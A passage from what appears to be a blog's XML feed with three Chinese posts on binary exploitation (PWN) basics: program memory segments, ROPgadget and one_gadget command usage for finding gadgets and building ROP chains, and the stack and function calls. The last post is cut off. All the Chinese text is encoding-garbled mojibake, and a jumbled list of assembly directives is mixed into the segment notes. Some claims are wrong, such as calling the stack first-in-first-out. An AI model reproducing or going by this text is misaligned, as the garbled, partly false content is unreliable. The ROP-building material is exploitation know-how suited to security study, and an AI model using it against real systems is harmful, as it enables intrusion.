        <content type="html"><![CDATA[<h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><h2 id="bssæ®µ"><a href="#bssæ®µ" class="headerlink" title="bssæ®µ"></a>bssæ®µ</h2><p>bssæ®µï¼ˆbss segmentï¼‰é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­<strong>æœªåˆå§‹åŒ–</strong>çš„å…¨å±€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚<br>bssæ®µå±äºé™æ€å†…å­˜åˆ†é…ã€‚</p><h2 id="dataæ®µ"><a href="#dataæ®µ" class="headerlink" title="dataæ®µ"></a>dataæ®µ</h2><p>æ•°æ®æ®µï¼ˆdata segmentï¼‰é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­<strong>å·²åˆå§‹åŒ–</strong>çš„å…¨å±€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚<br>æ•°æ®æ®µå±äºé™æ€å†…å­˜åˆ†é…ã€‚</p><h2 id="textæ®µ"><a href="#textæ®µ" class="headerlink" title="textæ®µ"></a>textæ®µ</h2><p>ä»£ç æ®µï¼ˆcode segment/text segmentï¼‰é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºæ‰§è¡Œä»£ç çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚<br>è¿™éƒ¨åˆ†åŒºåŸŸçš„å¤§å°åœ¨ç¨‹åºè¿è¡Œå‰å°±å·²ç»ç¡®å®šï¼Œå¹¶ä¸”å†…å­˜åŒºåŸŸé€šå¸¸å±äºåªè¯»(æŸäº›æ¶æ„ä¹Ÿå…è®¸ä»£ç æ®µä¸ºå¯å†™ï¼Œå³å…è®¸ä¿®æ”¹ç¨‹åº)ã€‚<br>åœ¨ä»£ç æ®µä¸­ï¼Œä¹Ÿæœ‰å¯èƒ½åŒ…å«ä¸€äº›åªè¯»çš„å¸¸æ•°å˜é‡ï¼Œä¾‹å¦‚å­—ç¬¦ä¸²å¸¸é‡ç­‰ã€‚</p><h2 id="å †-heap"><a href="#å †-heap" class="headerlink" title="å †(heap)"></a>å †(heap)</h2><p>å †æ˜¯ç”¨äºå­˜æ”¾è¿›ç¨‹è¿è¡Œä¸­è¢«åŠ¨æ€åˆ†é…çš„å†…å­˜æ®µï¼Œå®ƒçš„å¤§å°å¹¶ä¸å›ºå®šï¼Œå¯åŠ¨æ€æ‰©å¼ æˆ–ç¼©å‡ã€‚<br>å½“è¿›ç¨‹è°ƒç”¨<strong>malloc</strong>ç­‰å‡½æ•°åˆ†é…å†…å­˜æ—¶ï¼Œæ–°åˆ†é…çš„å†…å­˜å°±è¢«åŠ¨æ€æ·»åŠ åˆ°å †ä¸Šï¼ˆå †è¢«æ‰©å¼ ï¼‰ï¼›<br>å½“åˆ©ç”¨<strong>free</strong>ç­‰å‡½æ•°é‡Šæ”¾å†…å­˜æ—¶ï¼Œè¢«é‡Šæ”¾çš„å†…å­˜ä»å †ä¸­è¢«å‰”é™¤ï¼ˆå †è¢«ç¼©å‡ï¼‰ã€‚</p><h2 id="æ ˆ-stack"><a href="#æ ˆ-stack" class="headerlink" title="æ ˆ(stack)"></a>æ ˆ(stack)</h2><p><strong>æ ˆåˆç§°å †æ ˆ</strong>ï¼Œæ˜¯ç”¨æˆ·å­˜æ”¾ç¨‹åº<strong>ä¸´æ—¶åˆ›å»ºçš„å±€éƒ¨å˜é‡</strong>ï¼Œ<br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å‡½æ•°æ‹¬å¼§â€œ{}â€ä¸­å®šä¹‰çš„å˜é‡ï¼ˆä½†<strong>ä¸åŒ…æ‹¬staticå£°æ˜çš„å˜é‡</strong>ï¼Œstaticæ„å‘³ç€åœ¨æ•°æ®æ®µä¸­å­˜æ”¾å˜é‡ï¼‰ã€‚<br>é™¤æ­¤ä»¥å¤–ï¼Œåœ¨å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå…¶å‚æ•°ä¹Ÿä¼šè¢«å‹å…¥å‘èµ·è°ƒç”¨çš„è¿›ç¨‹æ ˆä¸­ï¼Œå¹¶ä¸”å¾…åˆ°è°ƒç”¨ç»“æŸåï¼Œå‡½æ•°çš„è¿”å›å€¼ä¹Ÿä¼šè¢«å­˜æ”¾å›æ ˆä¸­ã€‚<br>ç”±äºæ ˆçš„<strong>å…ˆè¿›å…ˆå‡º(FIFO)ç‰¹ç‚¹ï¼Œæ‰€ä»¥æ ˆç‰¹åˆ«æ–¹ä¾¿ç”¨æ¥ä¿å­˜/æ¢å¤è°ƒç”¨ç°åœºã€‚</strong></p><p><strong>ä»è¿™ä¸ªæ„ä¹‰ä¸Šè®²ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå †æ ˆçœ‹æˆä¸€ä¸ªå¯„å­˜ã€äº¤æ¢ä¸´æ—¶æ•°æ®çš„å†…å­˜åŒºã€‚</strong></p><h1 id="å…¶ä»–çŸ¥è¯†"><a href="#å…¶ä»–çŸ¥è¯†" class="headerlink" title="å…¶ä»–çŸ¥è¯†"></a>å…¶ä»–çŸ¥è¯†</h1><ul><li>å…¨å±€çš„æœªåˆå§‹åŒ–å˜é‡å­˜åœ¨äº.bssæ®µä¸­ï¼Œå…·ä½“ä½“ç°ä¸ºä¸€ä¸ªå ä½ç¬¦ï¼›</li><li>xxxxxxxxxx7 1        ã€€ã€€DW      å®šä¹‰å­—(2å­—èŠ‚).  2        PROC    å®šä¹‰è¿‡ç¨‹.  3        ENDP    è¿‡ç¨‹ç»“æŸ.  4        SEGMENT å®šä¹‰æ®µ.  5        ASSUME  å»ºç«‹æ®µå¯„å­˜å™¨å¯»å€.  6        ENDS    æ®µç»“æŸ.  7        END    ç¨‹åºç»“æŸ.C</li><li>å‡½æ•°å†…çš„è‡ªåŠ¨å˜é‡éƒ½åœ¨æ ˆä¸Šåˆ†é…ç©ºé—´ï¼›</li><li>.bssæ˜¯ä¸å ç”¨.exeæ–‡ä»¶ç©ºé—´çš„ï¼Œå…¶å†…å®¹ç”±æ“ä½œç³»ç»Ÿåˆå§‹åŒ–ï¼ˆæ¸…é›¶ï¼‰ï¼›</li><li>.dataå´éœ€è¦å ç”¨ï¼Œå…¶å†…å®¹ç”±ç¨‹åºåˆå§‹åŒ–ã€‚å› æ­¤é€ æˆäº†ä¸Šè¿°æƒ…å†µã€‚</li><li>bssæ®µï¼ˆæœªæ‰‹åŠ¨åˆå§‹åŒ–çš„æ•°æ®ï¼‰å¹¶ä¸ç»™è¯¥æ®µçš„æ•°æ®åˆ†é…ç©ºé—´ï¼Œåªæ˜¯è®°å½•æ•°æ®æ‰€éœ€ç©ºé—´çš„å¤§å°ï¼›</li><li>bssæ®µçš„å¤§å°ä»å¯æ‰§è¡Œæ–‡ä»¶ä¸­å¾—åˆ° ï¼Œç„¶åé“¾æ¥å™¨å¾—åˆ°è¿™ä¸ªå¤§å°çš„å†…å­˜å—ï¼Œç´§è·Ÿåœ¨æ•°æ®æ®µåé¢ã€‚</li><li>dataæ®µï¼ˆå·²æ‰‹åŠ¨åˆå§‹åŒ–çš„æ•°æ®ï¼‰åˆ™ä¸ºæ•°æ®åˆ†é…ç©ºé—´ï¼Œæ•°æ®ä¿å­˜åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ï¼›</li><li>dataæ®µåŒ…å«ç»è¿‡åˆå§‹åŒ–çš„å…¨å±€å˜é‡ä»¥åŠå®ƒä»¬çš„å€¼ã€‚å½“è¿™ä¸ªå†…å­˜åŒºè¿›å…¥ç¨‹åºçš„åœ°å€ç©ºé—´åå…¨éƒ¨æ¸…é›¶ã€‚<br><strong>åŒ…å«dataæ®µå’Œbssæ®µçš„æ•´ä¸ªåŒºæ®µæ­¤æ—¶é€šå¸¸ç§°ä¸ºæ•°æ®åŒºã€‚</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·ROPgadgets_and_One-gadget_RCE</title>
      <link href="/2025/02/08/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7ROPgadgets-and-One-gadget-RCE/"/>
      <url>/2025/02/08/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7ROPgadgets-and-One-gadget-RCE/</url>
      
        <content type="html"><![CDATA[<p>ROPgadgetæ˜¯ä¸€ç§åŸºäºä»£ç å¤ç”¨æŠ€æœ¯çš„æ”»å‡»å·¥å…·ï¼Œå®ƒå¯ä»¥å¸®åŠ©æ”»å‡»è€…åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°å¯åˆ©ç”¨çš„ä»£ç ç‰‡æ®µï¼ˆå³ROPé“¾ä¸­çš„gadgetsï¼‰ï¼Œä»è€Œæ„å»ºå‡ºæœ‰æ•ˆçš„æ”»å‡»è½½è·ã€‚ä»¥ä¸‹æ˜¯ROPgadgetçš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼š</p><h2 id="æŸ¥æ‰¾gadgets"><a href="#æŸ¥æ‰¾gadgets" class="headerlink" title="æŸ¥æ‰¾gadgets"></a>æŸ¥æ‰¾gadgets</h2><p>ä½¿ç”¨ROPgadgetçš„åŸºæœ¬å‘½ä»¤æ ¼å¼æ˜¯ï¼š<br><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">ROPgadget --binary &lt;æ–‡ä»¶å&gt; --only &lt;gadgetsç±»å‹&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><blockquote><p>å…¶ä¸­ï¼Œ&lt;æ–‡ä»¶å&gt;æ˜¯ä½ æƒ³è¦åˆ†æçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„ï¼Œ<gadgetsç±»å‹>æ˜¯ä½ æƒ³è¦æŸ¥æ‰¾çš„gadgetsçš„ç±»å‹ï¼Œæ¯”å¦‚â€œpop|retâ€è¡¨ç¤ºæŸ¥æ‰¾æ‰€æœ‰åŒ…å«popå’ŒretæŒ‡ä»¤çš„gadgetsã€‚</gadgetsç±»å‹></p><h4 id="å¸¸ç”¨"><a href="#å¸¸ç”¨" class="headerlink" title="å¸¸ç”¨"></a>å¸¸ç”¨</h4><p><code>ROPgadget --binary example --string &quot;/bin/sh&quot;</code><br><code>ROPgadget --binary example --only &quot;int&quot;</code><br>ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³åœ¨åä¸ºexampleçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾æ‰€æœ‰çš„popå’Œret gadgetsï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š<br><code>ROPgadget --binary example --only &quot;pop|ret&quot;</code><br>jmpå’Œret<br><code>ROPgadget --binary b0verfl0w --only &quot;jmp|ret&quot;</code>ROPgadget â€”binary libc.so.6 â€”only â€œpop|retâ€ |grep â€œraxâ€<code>&quot;rax&quot;&quot;rdx&quot;&quot;rdi&quot;&quot;rcx&quot;&quot;rsi&quot;</code>one_gadget /path/to/binary`<br>ROPgadgetä¼šè¾“å‡ºæ‰€æœ‰åŒ¹é…çš„gadgetsä»¥åŠå®ƒä»¬åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„åç§»åœ°å€ã€‚ </p><h2 id="åˆ†ægadgets"><a href="#åˆ†ægadgets" class="headerlink" title="åˆ†ægadgets"></a>åˆ†ægadgets</h2><p>æŸ¥çœ‹ROPgadgetçš„è¾“å‡ºï¼Œåˆ†æå“ªäº›gadgetså¯ä»¥è¢«ç”¨æ¥æ„å»ºROPé“¾ã€‚ä½ éœ€è¦æ‰¾åˆ°ä¸€ç³»åˆ—çš„gadgetsï¼Œå®ƒä»¬èƒ½å¤ŸæŒ‰é¡ºåºæ‰§è¡Œä½ æƒ³è¦çš„æ“ä½œï¼Œæ¯”å¦‚æ”¹å˜å¯„å­˜å™¨çš„å€¼ã€è°ƒç”¨ç³»ç»Ÿå‡½æ•°ç­‰ã€‚</p><h2 id="æ„å»ºROPé“¾ï¼š"><a href="#æ„å»ºROPé“¾ï¼š" class="headerlink" title="æ„å»ºROPé“¾ï¼š"></a>æ„å»ºROPé“¾ï¼š</h2><p>æ ¹æ®åˆ†æçš„ç»“æœï¼Œæ‰‹åŠ¨æˆ–ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·æ„å»ºROPé“¾ã€‚ROPé“¾æ˜¯ä¸€ç³»åˆ—gadgetsçš„åºåˆ—ï¼Œå½“å®ƒä»¬è¢«è¿ç»­æ‰§è¡Œæ—¶ï¼Œèƒ½å¤Ÿå®Œæˆæ”»å‡»è€…çš„ç›®æ ‡ï¼Œæ¯”å¦‚æ‰§è¡Œä»»æ„ä»£ç æˆ–è·å–shellã€‚</p><h2 id="æµ‹è¯•ROPé“¾ï¼š"><a href="#æµ‹è¯•ROPé“¾ï¼š" class="headerlink" title="æµ‹è¯•ROPé“¾ï¼š"></a>æµ‹è¯•ROPé“¾ï¼š</h2><p>åœ¨å—æ§çš„ç¯å¢ƒä¸­æµ‹è¯•æ„å»ºçš„ROPé“¾ï¼Œç¡®ä¿å®ƒèƒ½å¤ŸæŒ‰ç…§é¢„æœŸå·¥ä½œã€‚è¿™é€šå¸¸æ¶‰åŠåˆ°åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè§¦å‘æ¼æ´å¹¶åˆ©ç”¨ROPé“¾æ‰§è¡Œæ”»å‡»ã€‚</p></blockquote><pre class="line-numbers language-Powershell" data-language="Powershell"><code class="language-Powershell">ROPgadget çš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹ï¼šç”¨æ³•ï¼šROPgadget [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;][--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;] [--only &lt;key&gt;][--filter &lt;key&gt;] [--range &lt;start-end&gt;] [--badbytes &lt;byte&gt;][--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;] [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;][--offset &lt;hexaddr&gt;] [--ropchain] [--thumb] [--console] [--norop][--nojop] [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr][--dump] [--silent] [--align ALIGN] [--mipsrop &lt;rtype&gt;]é€‰é¡¹ç¿»è¯‘ï¼š     -h, --helpï¼šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡ºã€‚    -v, --versionï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡ºã€‚    -c, --colorï¼šè¾“å‡ºå½©è‰²ç»“æœï¼ˆéœ€è¦ç»ˆç«¯æ”¯æŒï¼‰ã€‚    --binary &lt;binary&gt;ï¼šæŒ‡å®šè¦åˆ†æçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚    --opcode &lt;opcodes&gt;ï¼šæœç´¢åŒ…å«æŒ‡å®šæŒ‡ä»¤çš„ gadgetsã€‚    --string &lt;string&gt;ï¼šæœç´¢åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„ gadgetsã€‚    --memstr &lt;string&gt;ï¼šæœç´¢åœ¨å†…å­˜ä¸­æ‰¾åˆ°æŒ‡å®šå­—ç¬¦ä¸²çš„ gadgetsã€‚    --depth &lt;nbyte&gt;ï¼šæœç´¢æŒ‡å®šæ·±åº¦çš„ gadgetsã€‚    --only &lt;key&gt;ï¼šä»…æ˜¾ç¤ºåŒ…å«æŒ‡å®šå…³é”®å­—çš„ gadgetsã€‚    --filter &lt;key&gt;ï¼šæ’é™¤åŒ…å«æŒ‡å®šå…³é”®å­—çš„ gadgetsã€‚    --range &lt;start-end&gt;ï¼šåœ¨æŒ‡å®šåœ°å€èŒƒå›´å†…æœç´¢ gadgetsã€‚    --badbytes &lt;byte&gt;ï¼šæ’é™¤åŒ…å«æŒ‡å®šå­—èŠ‚çš„ gadgetsã€‚    --rawArch &lt;arch&gt;ï¼šæŒ‡å®šåŸå§‹æ¶æ„ï¼ˆä¾‹å¦‚ x86, amd64, arm ç­‰ï¼‰ã€‚    --rawMode &lt;mode&gt;ï¼šæŒ‡å®šåŸå§‹æ¨¡å¼ï¼ˆä¾‹å¦‚ 32 æˆ– 64 ä½ï¼‰ã€‚    --rawEndian &lt;endian&gt;ï¼šæŒ‡å®šåŸå§‹å­—èŠ‚åºï¼ˆä¾‹å¦‚ little æˆ– bigï¼‰ã€‚    --re &lt;re&gt;ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢ gadgetsã€‚    --offset &lt;hexaddr&gt;ï¼šæ˜¾ç¤ºç»™å®šåç§»åœ°å€é™„è¿‘çš„ gadgetsã€‚    --ropchainï¼šä¸ºæ‰¾åˆ°çš„ gadgets ç”Ÿæˆä¸€ä¸ª ROP é“¾ã€‚    --thumbï¼šé’ˆå¯¹ ARM Thumb æŒ‡ä»¤é›†æœç´¢ gadgetsã€‚    --consoleï¼šå°†è¾“å‡ºå‘é€åˆ°æ§åˆ¶å°ï¼ˆåœ¨ --ropchain æ¨¡å¼ä¸‹æœ‰ç”¨ï¼‰ã€‚    --noropï¼šä¸æ˜¾ç¤º ROP gadgetsã€‚    --nojopï¼šä¸æ˜¾ç¤º JOP gadgetsã€‚    --callPrecededï¼šä»…æ˜¾ç¤ºè¢«è°ƒç”¨æŒ‡ä»¤å‰é¢çš„ gadgetsã€‚    --nosysï¼šä¸æ˜¾ç¤ºç³»ç»Ÿè°ƒç”¨ gadgetsã€‚    --multibrï¼šæ˜¾ç¤ºå¤šä¸ªåˆ†æ”¯çš„ gadgetsã€‚    --allï¼šæ˜¾ç¤ºæ‰€æœ‰ gadgetsï¼Œæ— è¿‡æ»¤ã€‚    --noinstrï¼šä¸æ˜¾ç¤ºæŒ‡ä»¤ï¼Œåªæ˜¾ç¤ºåç§»ã€‚    --dumpï¼šè¾“å‡º gadgets çš„åŸå§‹å­—èŠ‚ã€‚    --silentï¼šä¸æ˜¾ç¤ºä»»ä½•è­¦å‘Šæˆ–ä¿¡æ¯ã€‚    --align ALIGNï¼šå¯¹ gadgets åç§»è¿›è¡Œå¯¹é½ã€‚    --mipsrop &lt;rtype&gt;ï¼šé’ˆå¯¹ MIPS æ¶æ„ï¼ŒæŒ‡å®š ROP ç±»å‹ï¼ˆä¾‹å¦‚ rop, jop, rop_nopï¼‰ã€‚ è¿™äº›é€‰é¡¹å¯ä»¥å¸®åŠ©ä½ æ ¹æ®ç‰¹å®šéœ€æ±‚å®šåˆ¶ ROPgadget çš„æœç´¢å’Œåˆ†æè¿‡ç¨‹ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨ --opcode æ¥æœç´¢åŒ…å«ç‰¹å®šæŒ‡ä»¤åºåˆ—çš„ gadgetsï¼Œæˆ–è€…ä½¿ç”¨ --range æ¥é™åˆ¶æœç´¢çš„åœ°å€èŒƒå›´ã€‚ä½ è¿˜å¯ä»¥ä½¿ç”¨ --ropchain æ¥è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŸºäºæ‰¾åˆ°çš„ gadgets çš„ ROP é“¾ï¼Œè¿™å¯¹äºå¿«é€Ÿæ„å»ºæ”»å‡»è½½è·éå¸¸æœ‰ç”¨ã€‚ è¿™äº›ä¾‹å­å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ROPgadgetçš„ä¸åŒé€‰é¡¹æ¥æ‰§è¡Œç‰¹å®šçš„æœç´¢å’Œåˆ†æä»»åŠ¡ã€‚ä¸‹é¢æ˜¯æ¯ä¸ªä¾‹å­åŠå…¶ç”¨é€”çš„ä¸­æ–‡è§£é‡Šï¼šROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86è¿™ä¸ªå‘½ä»¤å¯¹æŒ‡å®šçš„x86 Linux ELFäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡ŒROP gadgetsæœç´¢ã€‚---------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --ropchainè¿™ä¸ªå‘½ä»¤é™¤äº†æœç´¢ROP gadgetsä¹‹å¤–ï¼Œè¿˜è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªROPé“¾ã€‚ --------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --depth 3è¿™ä¸ªå‘½ä»¤æœç´¢æ·±åº¦ä¸º3çš„ROP gadgetsï¼Œå³åªæœç´¢åŒ…å«3ä¸ªæˆ–æ›´å°‘æŒ‡ä»¤çš„gadgetsã€‚---------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --string &quot;main&quot;è¿™ä¸ªå‘½ä»¤æœç´¢åŒ…å«å­—ç¬¦ä¸²&quot;main&quot;çš„ROP gadgetsã€‚---------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --string &quot;m..n&quot;è¿™ä¸ªå‘½ä»¤ä½¿ç”¨é€šé…ç¬¦æœç´¢åŒ…å«ä»¥&quot;m&quot;å¼€å¤´ï¼Œæ¥ç€æ˜¯ä»»æ„å­—ç¬¦ï¼Œä»¥&quot;n&quot;ç»“å°¾çš„å­—ç¬¦ä¸²çš„gadgetsã€‚---------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --opcode c9c3è¿™ä¸ªå‘½ä»¤æœç´¢åŒ…å«ç‰¹å®šæŒ‡ä»¤åºåˆ—0xc9ï¼ˆleaveï¼‰å’Œ0xc3ï¼ˆretï¼‰çš„ROP gadgetsã€‚---------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --only &quot;mov|ret&quot;è¿™ä¸ªå‘½ä»¤ä»…æœç´¢åŒ…å«movæˆ–retæŒ‡ä»¤çš„ROP gadgetsã€‚--------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --only &quot;mov|pop|xor|ret&quot;è¿™ä¸ªå‘½ä»¤ä»…æœç´¢åŒ…å«movã€popã€xoræˆ–retæŒ‡ä»¤çš„ROP gadgetsã€‚----------------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --filter &quot;xchg|add|sub|cmov.*&quot;è¿™ä¸ªå‘½ä»¤æœç´¢ROP gadgetsï¼Œä½†æ’é™¤åŒ…å«xchgã€addã€subæˆ–ä»¥cmovå¼€å¤´çš„æŒ‡ä»¤çš„gadgetsã€‚----------------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --norop --nosysè¿™ä¸ªå‘½ä»¤æœç´¢gadgetsï¼Œä½†ä¸æ˜¾ç¤ºROP gadgetså’Œç³»ç»Ÿè°ƒç”¨gadgetsã€‚--------------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --range 0x08041000-0x08042000è¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åœ°å€èŒƒå›´å†…æœç´¢ROP gadgetsã€‚------------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --string main --range 0x080c9aaa-0x080c9abaè¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åœ°å€èŒƒå›´å†…æœç´¢åŒ…å«å­—ç¬¦ä¸²&quot;main&quot;çš„ROP gadgetsã€‚--------------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --memstr &quot;&#x2F;bin&#x2F;sh&quot;è¿™ä¸ªå‘½ä»¤æœç´¢åœ¨å†…å­˜ä¸­èƒ½æ‰¾åˆ°å­—ç¬¦ä¸²&quot;&#x2F;bin&#x2F;sh&quot;çš„ROP gadgetsã€‚------------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --consoleè¿™ä¸ªå‘½ä»¤å°†ROP gadgetsçš„è¾“å‡ºå‘é€åˆ°æ§åˆ¶å°ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¦‚ç”ŸæˆROPé“¾æ—¶ï¼Œå¯èƒ½å¾ˆæœ‰ç”¨ã€‚------------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;elf-Linux-x86 --badbytes &quot;00|01-1f|7f|42&quot;è¿™ä¸ªå‘½ä»¤æœç´¢ROP gadgetsï¼Œä½†æ’é™¤åŒ…å«ç‰¹å®šå­—èŠ‚åºåˆ—çš„gadgetsï¼Œå¦‚ç©ºå­—èŠ‚ã€æ§åˆ¶å­—ç¬¦å’Œå­—èŠ‚0x42ã€‚------------------ROPgadget.py --binary .&#x2F;test-suite-binaries&#x2F;Linux_lib64.so --offset 0xdeadbeef00000000è¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åº“æ–‡ä»¶ä¸­æœç´¢åç§»&#96;0xdeadbeef00000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-æ ˆå¸§ã€Cè¯­è¨€å‡½æ•°è°ƒç”¨</title>
      <link href="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/"/>
      <url>/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>åœ¨x86çš„è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œå†…å­˜ç©ºé—´ä¸­çš„æ ˆä¸»è¦ç”¨äº<em>ä¿å­˜å‡½æ•°çš„å‚æ•°ï¼Œè¿”å›å€¼ï¼Œè¿”å›åœ°å€ï¼Œæœ¬åœ°å˜é‡</em>ç­‰ã€‚ä¸€åˆ‡çš„å‡½æ•°è°ƒç”¨éƒ½è¦å°†ä¸åŒçš„æ•°æ®ã€åœ°å€å‹å…¥æˆ–è€…å¼¹å‡ºæ ˆã€‚å› æ­¤ï¼Œä¸ºäº†æ›´å¥½åœ°ç†è§£å‡½æ•°çš„è°ƒç”¨ï¼Œæˆ‘ä»¬éœ€è¦å…ˆæ¥çœ‹çœ‹æ ˆæ˜¯æ€ä¹ˆå·¥ä½œçš„ã€‚</p><h2 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="æ ˆ"></a>æ ˆ</h2><p>ç®€å•æ¥è¯´ï¼Œæ ˆæ˜¯ä¸€ç§<strong>LIFO</strong>å½¢å¼çš„æ•°æ®ç»“æ„ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯åè¿›å…ˆå‡ºã€‚è¿™ç§å½¢å¼çš„æ•°æ®ç»“æ„æ­£å¥½æ»¡è¶³æˆ‘ä»¬è°ƒç”¨å‡½æ•°çš„æ–¹å¼: çˆ¶å‡½æ•°è°ƒç”¨å­å‡½æ•°ï¼Œçˆ¶å‡½æ•°åœ¨å‰ï¼Œå­å‡½æ•°åœ¨åï¼›è¿”å›æ—¶ï¼Œå­å‡½æ•°å…ˆè¿”å›ï¼Œçˆ¶å‡½æ•°åè¿”å›ã€‚<strong>æ ˆæ”¯æŒä¸¤ç§åŸºæœ¬æ“ä½œï¼Œpushå’Œpopã€‚pushå°†æ•°æ®å‹å…¥æ ˆä¸­ï¼Œpopå°†æ ˆä¸­çš„æ•°æ®å¼¹å‡ºå¹¶å­˜å‚¨åˆ°æŒ‡å®šå¯„å­˜å™¨æˆ–è€…å†…å­˜ä¸­ã€‚</strong></p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªpushæ“ä½œçš„ä¾‹å­ã€‚å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ ˆï¼Œå…¶ä¸­é»„è‰²éƒ¨åˆ†æ˜¯å·²ç»å†™å…¥æ•°æ®çš„åŒºåŸŸï¼Œç»¿è‰²éƒ¨åˆ†æ˜¯è¿˜æœªå†™å…¥æ•°æ®çš„åŒºåŸŸã€‚ç°åœ¨æˆ‘ä»¬å°†0x50å‹å…¥æ ˆä¸­ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">push $0x50 &#x2F;&#x2F; å°†0x50çš„å‹å…¥æ ˆ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><img 